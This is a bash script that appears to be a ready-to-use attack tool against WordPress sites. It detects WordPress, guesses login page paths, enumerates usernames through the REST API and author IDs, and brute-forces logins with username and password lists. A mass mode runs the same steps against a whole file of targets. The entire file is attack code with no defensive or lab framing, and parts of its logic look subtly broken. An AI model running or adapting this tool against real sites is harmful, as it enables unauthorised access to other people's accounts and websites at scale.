#!/bin/bash

# Function to print colored and animated text
print_alert() {
    local message="$1"
    local color="$2"
    local effect="$3"

    if [[ "$effect" == "flash" ]]; then
        for i in {1..5}; do
            echo -e "\033[${color}m${message}\033[0m"
            sleep 0.3
            echo -e "\033[0m"  # Reset to normal
            sleep 0.3
        done
    else
        echo -e "\033[${color}m${message}\033[0m"
    fi
}

# Function to check if a URL is valid
check_url() {
    local url="$1"
    if ! curl -skL --head --request GET "$url" | grep "200 OK" > /dev/null; then
        print_alert "[!] $url is not reachable. Exiting." "31"  # Red
        exit 1
    fi
}

# Function to check if WordPress is detected
check_wordpress() {
    local url="$1"
    print_alert "[*] Checking if $url is a WordPress site..." "33"  # Yellow
    response=$(curl -skL "$url" | grep -i "wp-content")
    if [[ -z "$response" ]]; then
        print_alert "[!] Not a WordPress site." "31"  # Red
        exit 1
    fi
    print_alert "[+] WordPress detected at $url." "32"  # Green
}

# Function to detect login URL
detect_login_url() {
    local url="$1"
    print_alert "[*] Detecting login URL..." "34"  # Blue

    local login_paths=(
        "wp-login.php" "wp-admin" "login" "user-login.php"
        "administrator" "admin" "login.php" "user"
        "auth/login" "auth/admin"
    )

    for path in "${login_paths[@]}"; do
        login_url="${url}/${path}"
        response=$(curl -skL "$login_url")
        if echo "$response" | grep -qi "login"; then
            print_alert "[+] Found login page at: $login_url" "32"  # Green
            echo "$login_url"
            return
        fi
    done

    print_alert "[!] Login URL not found." "31"  # Red
    exit 1
}

# Function to enumerate users
enumerate_users() {
    local url="$1"
    print_alert "[*] Starting user enumeration on $url..." "34"  # Blue

    # REST API Enumeration
    response=$(curl -skL "$url/wp-json/wp/v2/users")
    if echo "$response" | grep -q "name"; then
        print_alert "[+] Found users via REST API:" "32"  # Green
        echo "$response" | jq '.[] | .name' | tee -a usernames.txt
    fi

    # Author ID Enumeration
    for i in {1..10}; do
        author_url="$url/?author=$i"
        response=$(curl -skL "$author_url")
        if [[ "$response" =~ "author-" ]]; then
            username=$(echo "$response" | grep -oP 'author-\K[^"]+')
            print_alert "[+] Found username: $username" "32"  # Green
            echo "$username" >> usernames.txt
        fi
    done
}

# Function to perform brute force
brute_force() {
    local login_url="$1"
    local usernames_file="$2"
    local passwords_file="$3"
    print_alert "[*] Starting brute force on $login_url..." "34"  # Blue

    while IFS= read -r username; do
        while IFS= read -r password; do
            print_alert "[*] Trying $username:$password..." "33"  # Yellow
            response=$(curl -skL -d "log=$username&pwd=$password" -X POST "$login_url")
            if echo "$response" | grep -q "dashboard"; then
                print_alert "[+] Valid credentials found: $username:$password" "32"  # Green
                return
            fi
        done < "$passwords_file"
    done < "$usernames_file"

    print_alert "[!] No valid credentials found." "31"  # Red
}

# Function for mass attack on a list of targets
mass_attack() {
    local targets_file="$1"
    while IFS= read -r target; do
        print_alert "[*] Target: $target" "33"  # Yellow
        check_wordpress "$target"
        login_url=$(detect_login_url "$target")
        enumerate_users "$target"
        brute_force "$login_url" "usernames.txt" "passwords.txt"
    done < "$targets_file"
}

# Main function
main() {
    if [[ "$#" -lt 2 ]]; then
        print_alert "Usage: $0 -u <url> [--mass targets.txt] [--enumerate] [--brute usernames.txt passwords.txt]" "31"  # Red
        exit 1
    fi

    while [ "$1" != "" ]; do
        case $1 in
            -u | --url)
                shift
                url="$1"
                ;;
            --mass)
                shift
                mass_enabled=true
                targets_file="$1"
                ;;
            --enumerate)
                enumerate_enabled=true
                ;;
            --brute)
                brute_enabled=true
                usernames_file="$2"
                passwords_file="$3"
                shift 3
                ;;
            *)
                print_alert "Invalid option: $1" "31"  # Red
                exit 1
                ;;
        esac
        shift
    done

    if [ "$mass_enabled" = true ]; then
        mass_attack "$targets_file"
        exit 0
    fi

    check_wordpress "$url"
    login_url=$(detect_login_url "$url")

    if [ "$enumerate_enabled" = true ]; then
        enumerate_users "$url"
    fi

    if [ "$brute_enabled" = true ]; then
        brute_force "$login_url" "$usernames_file" "$passwords_file"
    fi
}

# Run the main function
main "$@"
